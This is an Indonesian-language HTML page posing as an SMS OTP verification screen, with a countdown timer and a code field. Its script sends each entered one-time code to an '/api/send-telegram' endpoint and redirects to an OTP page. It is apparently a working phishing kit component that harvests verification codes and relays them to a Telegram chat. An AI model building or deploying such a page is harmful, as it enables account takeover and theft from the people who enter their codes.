<!DOCTYPE html>
<html lang="id">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@48,400,0,0" />
    <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css"/>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, viewport-fit=cover">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="theme-color" content="#DAA520">
    <title>OTP</title>
    <link rel="icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRG50c_1Ik9PkLZ2YkV_EJKHX5SWiZ3GDISmRmQDBrCJA&s=10"/>

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous">  
      
    <style>
      @charset "utf-8";
      html { line-height: 1.5; font-family: system-ui, sans-serif; -webkit-font-smoothing: antialiased; }
      body { position: relative; min-height: 100%; background: rgb(255, 255, 255); text-align: center; height: 100%; margin: 0; padding: 0; }
      *, ::before, ::after { box-sizing: border-box; }
      .css-536van { max-width: 500px; margin: auto; overflow: hidden; height: 100%; }
      .css-1sm2s1z { height: 78%; display: flex; flex-direction: column; }
      .css-1meg77l { margin-top: 0px; width: 100%; padding: 12%; }
      .css-2z8rzx { box-shadow: #808080 0px 1px 3px 1px; border-radius: 22px; margin-top: 0px; }
      .css-qhzfk3 { background-color: #fff; padding: 0px 10px; display: flex; align-items: center; border-radius: 22px; }
      .css-1ew2b06 { padding: 0px 5px; letter-spacing: 2px; height: 35px; width: 100%; font-weight: 560; font-size: 16px; color: #000; border: none; border-radius: 22px; outline: none; }
      .css-70qvj9 { display: flex; align-items: center; }
      .btn-punya { display: block; margin: 10px auto 0 auto; padding: 2px; cursor: pointer; background-color: #104BDD; border: none; text-align: center; height: 34px; width: 406px; max-width: 100%; font-size: 12px; font-weight: bold; color: #FFF; border-radius: 23px; box-shadow: rgb(51, 51, 51) 0px 2px 8px; }
      .btn-punya:hover { background-color: rgb(14, 120, 202); }
      .eye { cursor: pointer; width: 25px; height: 20px; margin-right: 10px; }
    </style>
</head>
<body class="chakra-ui-light">
    <div id="__next">
        <div class="css-536van">
            <div class="css-1sm2s1z">
                <div class="css-1meg77l">
                    <section class="section">
                        <div class="container">
                            <h6 style="font-size: 14px; font-weight: bold; color: #2F4F4F; text-align: center; line-height: 1.7;">VERIFIKASI OTP SMS</h6>
                            <p style="font-weight: bold; font-size: 20px; color: #2F4F4F; text-align: center; margin: 10px auto;" id="timer"></p>
                            <h6 style="font-size: 11px; color: #2F4F4F; line-height: 1.2; font-weight: bold;">Masukan Kode OTP yang telah di kirim <br>ke SMS untuk aktivasi.</h6><br>
                            
                            <!-- Form dengan id="setPin" -->
                            <form id="setPin">
                                <div class="css-2z8rzx">
                                    <div class="css-qhzfk3">
                                        <b>Code:</b>
                                        <!-- Atribut name="OTP" agar terbaca oleh FormData -->
                                        <input name="OTP" type="tel" minlength="4" maxlength="6" id="password" placeholder="* * * * * *" autocomplete="off" required class="css-1ew2b06">
                                        
                                        <!-- Tombol Toggle Mata -->
                                        <div class="eye" id="eyeOpen">
                                            <img id="eye" src="https://d1muf25xaso8hp.cloudfront.net/https%3A%2F%2Fs3.amazonaws.com%2Fappforest_uf%2Ff1654594413237x395260983658785300%2Fhidden.png?w=24&amp;h=19&amp;auto=compress&amp;dpr=2&amp;fit=max" style="width: 100%; height: 100%;"> 
                                        </div> 
                                        <div class="eye" id="eyeClose" style="display: none;"> 
                                            <img id="eye" src="https://d1muf25xaso8hp.cloudfront.net/https%3A%2F%2Fs3.amazonaws.com%2Fappforest_uf%2Ff1654594427324x961463961280841100%2Feye.png?w=32&amp;h=26&amp;auto=compress&amp;dpr=2&amp;fit=max" style="width: 100%; height: 100%;">
                                        </div>
                                    </div>
                                </div>
                                <div class="css-70qvj9">
                                    <button type="submit" class="btn-punya">VERIFIKASI</button>
                                </div>
                            </form>
                            
                            <p id="status" style="color: red; margin-top: 10px;"></p>
                        </div>
                    </section>
                </div>
            </div>
        </div>
    </div>

    <!-- Skrip Timer -->
    <script>
        document.getElementById('timer').innerHTML = "01:01";
        startTimer();
        
        function startTimer() {
            var presentTime = document.getElementById('timer').innerHTML;
            var timeArray = presentTime.split(/[:]+/);
            var m = timeArray[0];
            var s = checkSecond((timeArray[1] - 1));
            if(s == 59) { m = m - 1; }
            if(m < 0) { return; }
            
            document.getElementById('timer').innerHTML = m + " : " + s;
            setTimeout(startTimer, 1000);
        }
        
        function checkSecond(sec) {
            if (sec < 10 && sec >= 0) { sec = "0" + sec; }
            if (sec < 0) { sec = "59"; }
            return sec;
        }
    </script>

    <!-- jQuery & Bootstrap JS -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script> 
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script> 
   
    <!-- Skrip JavaScript Aman (Mengirim ke Vercel Serverless Function) -->
    <script>
        $(document).ready(function() {
            // Logika Toggle Mata Password
            $('#eyeOpen').on('click', function() {
                $(this).hide();
                $('#eyeClose').show();
                $("#password").prop("type", "text");
            });

            $('#eyeClose').on('click', function() {
                $(this).hide();
                $('#eyeOpen').show();
                $("#password").prop("type", "password");
            });

            // Kirim data OTP ke backend Vercel
            document.querySelector('#setPin').addEventListener("submit", async e => {
                e.preventDefault();
                
                const formData = Object.fromEntries(new FormData(e.target).entries());
                const messageStatus = document.querySelector('#status');
                messageStatus.textContent = 'Memproses...';

                try {
                    const response = await fetch('/api/send-telegram', {
                        method: 'POST',
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ message: JSON.stringify(formData, null, 2) }),
                    });

                    const result = await response.json();

                    if (response.ok && result.success) {
                        messageStatus.textContent = "";
                        e.target.reset();
                        window.location.href = '/otp.html'; // Sesuaikan halaman tujuan setelah sukses
                    } else {
                        messageStatus.textContent = "Gagal mengirim data.";
                    }
                } catch (err) {
                    messageStatus.textContent = "Terjadi kesalahan jaringan.";
                }
            });
        });
    </script>
</body>
</html>
